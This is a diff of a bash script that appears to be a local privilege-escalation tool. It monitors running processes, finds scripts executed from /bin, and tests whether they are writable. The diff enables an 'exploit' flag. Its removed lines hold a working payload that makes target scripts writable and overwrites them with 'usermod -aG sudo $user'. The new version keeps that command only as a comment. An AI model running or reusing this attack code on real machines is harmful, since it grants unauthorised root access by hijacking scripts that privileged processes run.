@@ -1,6 +1,6 @@
 #! /bin/bash
 
-exploit=false
+exploit=true
 
 # over one minute keep track of all the processes that run
 # get any that are run with /bin/* executables 
@@ -11,22 +11,12 @@ rm /tmp/procs.tmp
 echo $script_files
 
 while read file; do
-	user=$(stat -c "%U" $file)
-	writable=false
-	owner=false
 
-	if [[ -w $file ]] then # if this file is writable by this user
-		writable=true
-	elif [[ $user == $(whoami) ]] then
-		owner=true
+	writable=$(check_writable "$file" "$exploit")
+
+	if [[ "$exploit" = true ]] && [[ "$writable" = true ]] then
+		echo Modifying ${file}...
+		# echo usermod -aG sudo $user > $file
 	fi
 
-	if [[ "$exploit" = true ]] then
-		if [[ "$writable" = true ]] then
-			echo usermod -aG sudo $user > $file
-		elif [[ "$owner" = true ]] then
-			chmod u+rw $file
-			echo usermod -aG sudo $user > $file
-		fi
-	fi
 done <<< "$script_files"
